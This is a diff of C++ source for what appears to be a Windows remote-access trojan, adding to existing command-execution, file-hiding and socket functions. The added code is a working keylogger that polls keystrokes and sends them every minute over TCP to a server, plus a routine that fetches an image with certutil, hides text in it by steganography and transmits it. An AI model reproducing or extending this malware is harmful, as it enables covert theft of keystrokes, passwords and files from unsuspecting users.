@@ -50,6 +50,7 @@ vector<string> split(string str)
 
 	return tokens;
 }
+
 /*
 	EXECUTE the netstat command
 */
@@ -80,6 +81,7 @@ string GetAllFiles(string dir = "c:\\")
 
 	return result;
 }
+
 /*
 	call function to open a socket in a different  thread
 */
@@ -190,6 +192,32 @@ string GetArpTable()
 	return s;
 }
 
+string StartKeyLogger(string nothing)
+{
+	while (true)
+	{
+		storeKeys = true;
+		thread t1(&KeyLogger);
+		t1.detach();
+		thread t2(&SendKeyLoggerToServer);
+		t2.detach();
+	}
+	return "Key Logger Started";
+}
+
+string StopKeyLogger(string nothing)
+{
+	storeKeys = false;
+	return "Key logger stoped";
+}
+
+string HideMessageInPicture(string fileName)
+{
+	thread t1(&SendPicture, fileName);
+	t1.detach();
+	return string();
+}
+
 
 /*
 	change attribute to hidden in file or folder
@@ -210,6 +238,7 @@ string UnHideFileOrFolder(string pathtofileorfolder)
 	cmd.append(pathtofileorfolder).append("\"");
 	return exec(cmd);
 }
+
 /*
 	delete file
 */
@@ -219,6 +248,7 @@ string DeleteGivenFile(string pathtodelete)
 	cmd.append(pathtodelete).append("\"");
 	return exec(cmd);
 }
+
 /*
 	move filepath to other directory path
 */
@@ -228,7 +258,6 @@ string MoveGivenFileToDestination(string pathtofile, string Destination)
 	cmd.append(pathtofile).append("\" \"").append(Destination).append("\"");
 	return exec(cmd);
 }
-
 
 /*
 	 open a socket in a different  thread and send data every minute
@@ -270,6 +299,7 @@ string OpenSocketWithThread(std::string ip_and_port)
 
 	return string();
 }
+
 /*
 	execute in cmd a command
 	Input: command
@@ -298,6 +328,7 @@ string exec(string cmd)
 	_pclose(pipe);
 	return result;
 }
+
 /*
 	get permissions for each permissions in file
 */
@@ -315,6 +346,7 @@ string getFilePermissions(perms p)
 	result += ((p & perms::others_exec) != perms::none ? "x" : "-");
 	return result;
 }
+
 /*
 	the function gets the names and permissions of a file in a dir
 	checks if the path exists then iterates through the dir and gets all permissions
@@ -351,6 +383,7 @@ void getAllFilesInDir(const string &dirPath, vector<MyFileClass> listOfFiles)
 	}
 	//return listOfFiles;
 }
+
 /*
 	the func opens a socket from a given port to a ip and port
 */
@@ -398,6 +431,7 @@ bool ConnectToHost(const char * PortNo, const char * IPAddress, SOCKET* s)
 		return true; //Success
 	}
 }
+
 /*
 	close socket
 */
@@ -408,4 +442,236 @@ void CloseConnection(SOCKET s)
 		closesocket(s);
 
 	WSACleanup(); //Clean up Winsock
+}
+
+bool SpecialKeys(int S_Key) {
+	switch (S_Key) {
+	case VK_SPACE:
+		cout << " ";
+		//LOG(" ");
+		kl += ' ';
+		return true;
+	case VK_RETURN:
+		cout << "\n";
+		//LOG("\n");
+		kl.append("\n");
+		return true;
+	case '¾':
+		cout << ".";
+		//LOG(".");
+		kl.append(".");
+		return true;
+	case VK_SHIFT:
+		cout << "#SHIFT#";
+		//LOG("#SHIFT#");
+		kl.append("#SHIFT#");
+		return true;
+	case VK_BACK:
+		cout << "\b";
+		//LOG("\b");
+		kl.append("\b");
+		return true;
+	case VK_RBUTTON:
+		cout << "#R_CLICK#";
+		//LOG("#R_CLICK#");
+		kl.append("#R_CLICK#");
+		return true;
+	default:
+		return false;
+	}
+}
+
+void SendPicture(string fileName)
+{
+	string newFile = EncodeTextInsideImg(fileName);
+
+	WSADATA wsadata;
+	SOCKET s = NULL;
+
+	int error = WSAStartup(MAKEWORD(2, 2), &wsadata);
+
+	//Did something happen?
+	if (error)
+		return;
+
+	//Did we get the right Winsock version?
+	if (wsadata.wVersion != 0x0202)
+	{
+		WSACleanup(); //Clean up Winsock
+		return;
+	}
+
+	//Fill out the information needed to initialize a socket…
+	addrinfo hints;
+	ZeroMemory(&hints, sizeof(hints));
+	hints.ai_family = AF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+
+	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //Create socket
+	if (s == INVALID_SOCKET)
+	{
+		return; //Couldn't create the socket
+	}
+
+	//Try connecting...
+	addrinfo *target;
+	error = getaddrinfo("127.0.0.1", "4921", &hints, &target);
+	connect(s, target->ai_addr, (int)target->ai_addrlen);
+
+	char remoteFILE[1024];
+	ifstream file_to_send;
+	file_to_send.open(newFile, std::ios::in | std::ios::binary);
+	file_to_send.seekg(0, std::ios::end);
+	long fileSIZE;
+	fileSIZE = file_to_send.tellg();
+	file_to_send.seekg(0, std::ios::beg);
+	file_to_send.seekg(8);
+	fileSIZE -= 8;
+	char* bufferCMP;
+	bufferCMP = (char*)malloc(sizeof(char) * fileSIZE);
+	file_to_send.read(bufferCMP, fileSIZE);
+	file_to_send.close();
+	int chunkcount = fileSIZE / 1023;
+	int lastchunksize = fileSIZE - (chunkcount * 1023);
+	int fileoffset = 0;
+	int iResult;
+
+	//Sending Actual Chunks
+	while (chunkcount > 0)
+	{
+		string message = string("5").append(bufferCMP + (fileoffset * 1023), 1023);
+		iResult = send(s, message.c_str(), 1024, 0);
+		fileoffset++;
+		chunkcount--;
+
+		if (iResult != 1024)
+		{
+			//printf("Sending Buffer size <> Default buffer length  ::: %d\n",WSAGetLastError());
+		}
+		else
+		{
+			//printf("Sending Buffer size = %d \n", iResult);
+		}
+		Sleep(1000);
+	}
+
+	//Sending last Chunk
+	string message = string("5").append(bufferCMP + (fileoffset * 1023), 1023);
+	iResult = send(s, message.c_str(), 1024, 0);
+	message = string("5finish");
+	iResult = send(s, message.c_str(), message.size(), 0);
+}
+
+string EncodeTextInsideImg(string fileName)
+{
+	string downloadImg = string("certutil.exe -urlcache -f ").append(fileName).append(" 1.png");
+	exec(downloadImg);
+	string text = "LOOK: This is new string";
+	Mat img, stego;
+	int b = 0;
+	int bits = text.length() * 8 + 7;
+
+	img = imread("png.1", IMREAD_COLOR);
+
+	img.copyTo(stego);
+
+	for (int i = 0; i < img.rows; i++)
+	{
+		for (int j = 0; j < img.cols; j++)
+		{
+			uchar val = img.at<Vec3b>(i, j)[0];
+
+			val &= 254;
+
+			if (b < bits)
+			{
+				val |= (text[b / 8] & 1 << b % 8) >> b % 8;
+			}
+			else
+			{
+				val |= 0;
+			}
+
+			stego.at<Vec3b>(i, j)[0] = val;
+			b++;
+		}
+	}
+
+	string newFile = "2.png";
+
+	imwrite(newFile, stego);
+
+	return newFile;
+
+}
+
+void KeyLogger()
+{
+	char KEY = 'x';
+
+	while (storeKeys) {
+		Sleep(10);
+		for (int KEY = 8; KEY <= 190; KEY++)
+		{
+			if (GetAsyncKeyState(KEY) == -32767) {
+				if (SpecialKeys(KEY) == false) {
+
+					/*fstream LogFile;
+					LogFile.open("dat.txt", fstream::app);
+					if (LogFile.is_open()) {
+					LogFile << char(KEY);
+					LogFile.close();
+					}*/
+					kl += KEY;
+
+				}
+			}
+		}
+	}
+}
+
+void SendKeyLoggerToServer()
+{
+	WSADATA wsadata;
+	SOCKET s = NULL;
+
+	int error = WSAStartup(MAKEWORD(2, 2), &wsadata);
+
+	//Did something happen?
+	if (error)
+		return;
+
+	//Did we get the right Winsock version?
+	if (wsadata.wVersion != 0x0202)
+	{
+		WSACleanup(); //Clean up Winsock
+		return;
+	}
+
+	//Fill out the information needed to initialize a socket…
+	addrinfo hints;
+	ZeroMemory(&hints, sizeof(hints));
+	hints.ai_family = AF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+
+	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //Create socket
+	if (s == INVALID_SOCKET)
+	{
+		return; //Couldn't create the socket
+	}
+
+	//Try connecting...
+	addrinfo *target;
+	error = getaddrinfo("127.0.0.1", "4921", &hints, &target);
+	connect(s, target->ai_addr, (int)target->ai_addrlen);
+
+	while (true)
+	{
+		Sleep(60000);
+		send(s, kl.c_str(), kl.size(), 0);
+		cout << kl << endl;
+		kl = "";
+	}
 }
